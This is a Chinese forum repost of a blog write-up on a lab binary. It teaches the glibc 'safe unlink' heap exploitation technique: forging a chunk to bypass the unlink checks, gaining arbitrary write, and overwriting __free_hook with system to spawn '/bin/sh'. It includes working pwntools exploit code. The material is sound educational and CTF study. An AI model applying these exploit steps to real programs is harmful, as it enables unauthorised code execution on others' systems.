> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1448188-1-1.html)

> [md] 再贴一下自己的博客 [https://hack1s.fun](https://hack1s.fun)libc 的版本是 2.30, 没有编译 tcache 的版本上传附件限制 3MB，libc 比较大就没有......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒

再贴一下自己的博客 [https://hack1s.fun](https://hack1s.fun)

libc 的版本是 2.30, 没有编译 tcache 的版本

上传附件限制 3MB，libc 比较大就没有传了嗷，可以直接用 glibc-all-in-one 或者 LibcSearcher 里面的

Safe_Unlink
-----------

前面说的 Unsafe_Unlink 是比较老的技术，后面 glibc 对堆的 unlink 进行了检查，另外也支持了 NX 这样的技术；

这一节介绍 Safe_Unlink 的攻击方法；

我们直接来看一下这次用到的程序

![](https://static.hack1s.fun/images/2021/04/25/image-20210425161118970.png)

相比之前的程序，主要有两处不同，首先是程序开启了 NX，另外就是使用到了更加新的 glibc

程序运行起来还是一个类似的选单

![](https://static.hack1s.fun/images/2021/04/25/image-20210425161341347.png)

我们首先还是尝试获取到任意地址写的能力，修改这里的 target 值，之后利用这个任意地址写提升为命令执行的权限；

在比较新的 glibc 中，unlink 从原本的一个宏变成了函数，下面这个宏是我们之前 unsafe_unlink 中的 unlink

```
#define unlink(P,BK,FD)
{
  BK = P->bk;
  FD = P->fd;
  FD->bk = BK;
  BK->fd = FD;
}

```

之后在更新的 glibc 中变成了这样的一个函数:

```
static void unlink_chunk(mstate av, mchunkptr p){
  if(chunksize (p) != prev_size(next_chunk(p)))
    malloc_printerr("corrupted size vs. prev_size");
  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;
  if(__builtin_expert(fd->bk!=p || bk->fd! = p,0))
    malloc_printerr("corrupted double-linked list");
  fd->bk = bk;
  bk->fd = fd;
  ...
}

```

再下面的一部分的代码就是针对 smallbin 设置 nextsize 相关的地方了，对我们这次看的不是特别关键；

我们只关注这两个 if 判断就可以，可以看到这两个 if 判断比较了`fd->bk`和`bk->fd`事都是这个 chunk 本身；

如果 fd、bk 没有指向这个要 unlink 的 chunk 就会报错；

在 linux 的堆管理器中有一个优化，就是堆管理器在将内存分配给线程之后就不会再去管这个内存块的地址了，它只会关注线程总体的`top_chunk`以及`free_list`

在这种情况下，进程需要有一个地方存储自己申请的堆块地址，有的程序会放在栈上，有的放在堆上，像这个程序的话则是放在了 bss 段中一个叫做`m_array`的变量中，（这个名字可以随便起，这只是这个程序里叫这个）

我们在 IDA 中打开这个程序可以看到申请内存相关的地方存在对这个的设置；

![](https://static.hack1s.fun/images/2021/04/25/image-20210425162921932.png)

在 gdb 调试中查看这个地方

![](https://static.hack1s.fun/images/2021/04/25/image-20210425164509458.png)

首先`p &m_array`打出了这个数组的地址为`0x602060`

用`xinfo 0x602060`可以查看这个地址所在虚拟内存的映射情况，这里写出属于`safe_unlink`这个二进制本身的`bss`段

用`p m_array`可以打印出这个结构的值

最后也可以用`ptype`查看这里的定义

![](https://static.hack1s.fun/images/2021/04/25/image-20210425164717746.png)

这里看到定义的是长度为二的两个机构，分别存储着`user_data`以及`request_size`

我们用 vis 看到的堆布局和这个一致

![](https://static.hack1s.fun/images/2021/04/25/image-20210425164901633.png)

以及随手敲的两个长度也是对应的

![](https://static.hack1s.fun/images/2021/04/25/image-20210425165005913.png)

既然这里存着一个这样的结构，其中存在两个指向 chunk 的 userdata 部分的指针，我们就可以利用这个指针来伪造 chunk 进而绕过 safe unlink 的检查；

任意地址写
-----

### 通过溢出伪造 chunk_B

首先我们还是用和之前类似的方法，编辑 chunk_A 的内容，消除 chunk_B 的`prev_inuse`标志位，这样在之后`free(B)`的时候堆管理器会误以为 chunk_A 也已经被 free 掉了，进而合并 chunk_A、chunk_B 和 top_chunk

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata.
fd = 0xdeadbeef                                                                                                                                          
bk = 0xcafebabe
prev_size = 0x90
fake_size = 0x90
edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))

```

运行看到通过溢出，chunk_B 的`prev_inuse`被清零

![](https://static.hack1s.fun/images/2021/04/25/image-20210425171625300.png)

同时 chunk_A 最后 8 个字节被算作 chunk_B 的一部分，是`prev_size`

`fd`和`bk`也都是目前伪造的地址；

如果是之前的那种远古`unlink`宏，直接修改 fd、bk 就可以达到任意地址写的效果；

但是前面我们也说到了更新一些的 glibc 中对 unlink 做了更细致的检查

会检查`0xdeadbeef->bk`以及`0xcafebabe->fd`是否为`0x603000`

那么这里就没办法简单的直接修改了；

### 借助 m_array 中的指针绕过 unlink 检查

我们前面看到，这个程序中在 bss 段存储着一个用于统计分配给进程的堆的数据结构，其中存在两个指向 userdata 的指针

把这个指针当作是一个 chunk 的 fd，那么我们伪造的 chunk 的 bk 就可以指向这里，`bk->fd==p`就可以绕过了

把这个指针当作是一个 chunk 的 bk，那么我们伪造的 chunk 的 fd 就可以指向这里，`fd->bk==p`就可以绕过了

```
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10

```

![](https://static.hack1s.fun/images/2021/04/25/image-20210425203528887.png)

这时可以看到，我们伪造的被 free 的 chunk_A 中的`fd->bk==0x603010`，但是这个值并不是 chunk 本身，而是 chunk 中的 user data 起始位置；

`m_array`中的值是没办法直接改动的，因此我们在伪造 chunk 的时候干脆连 meta data 一起伪造，伪造出一个从`0x603010`开始的 chunk

在前面增加一个 0 和一个 0x80 的大小，后面记得要减小 0x10 的填充数据大小

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata.
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10

prev_size = 0x80
fake_size = 0x90

edit(chunk_A, p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))   

```

![](https://static.hack1s.fun/images/2021/04/25/image-20210425204209112.png)

可以看到伪造的内容是一个大小 0x80 的 chunk，继续运行，`free(1)`把后面的 chunk_A 给 free 掉

这时堆管理器处理时看到 prev_inuse 是 0，就根据 prev_size 与前面的块合并，一同合并到 top_chunk

执行完之后再断下来看一下，但是这时不能用`vis`了，因为堆已经被破坏了

我们用`mp_.sbrk_base`可以看到 top_chunk 已经变成了 0x603010 了也就是我们伪造的那个 chunk 的开始位置

也就是说两个空闲堆块已经 consolidate 到 top_chunk 了

![](https://static.hack1s.fun/images/2021/04/25/image-20210425204543853.png)

再查看一下 m_array

![](https://static.hack1s.fun/images/2021/04/25/image-20210425205430002.png)

可以看到`m_array[0]`已经变成了`0x602048`

这是我们之前伪造的`bk->fd=fd`写入的

（伪造的 bk 是`0x602050`，指向的块的 fd 是`0x602060`，伪造的 fd 是`0x602048`；所以这里就是在`0x602060`的位置写入了`0x602048`）

这时由于`m_array[0]`的值已经被我们控制了，再使用`edit(0)`执行时就是往`0x602048`处写内容，也就是可以再次修改`m_array`的内容

我们再修改一次`m_array[0]`，将其修改为我们想要写入值的地址，比如修改为 target 的地址

之后再一次`edit(0)`，就可以修改 target 中的内容了

![](https://static.hack1s.fun/images/2021/04/25/image-20210425210323547.png)

Drop a Shell！
-------------

有了任意地址写的能力之后，我们进一步就想要提升权限为返回一个 shell

我们还是直接修改`free_hook`的值为`system`，这样`free`的时候就可以调用 system

那么问题就是哪里放 "/bin/sh" 呢？

这边有一个比较 tricky 的方法，就是在修改`__free_hook`的时候不直接把`m_array[0]`修改为`__free_hook`

我们可以修改为`__free_hook - 8`这样`__free_hook`前面 8 个字节放`"/bin/sh\x00"`，之后是`system`的地址

并且由于`m_array[0]`指向的是`__free_hook - 8`正好就是`/bin/sh`的位置

![](https://static.hack1s.fun/images/2021/04/25/image-20210425211442076.png)

在 IDA 中可以看到，调用选项三的时候最终实际上就是`free(m_array[nb].user_data)`

所以直接调用`free(0)`就会调用`system("/bin/sh")`

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata.
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10

prev_size = 0x80
fake_size = 0x90

edit(chunk_A, p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

free(chunk_B)

#edit(chunk_A, p64(0)*3 + p64(elf.sym['target']))
edit(chunk_A, p64(0)*3 + p64(libc.sym['__free_hook']-8))
edit(chunk_A,b"/bin/sh\x00"+p64(libc.sym["system"]))

free(chunk_A)

```

看到最后的结果

![](https://static.hack1s.fun/images/2021/04/25/image-20210425211238213.png)

拿到了任意代码执行的能力

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[safe_unlink.zip](forum.php?mod=attachment&aid=MjI5NzU2M3w1MWI0NjZlMHwxNjIyMDk0NTQ5fDIxMzQzMXwxNDQ4MTg4)

2021-5-27 12:47 上传

点击文件名下载附件

下载积分: 吾爱币 -1 CB  

6.1 KB, 下载次数: 0, 下载积分: 吾爱币 -1 CB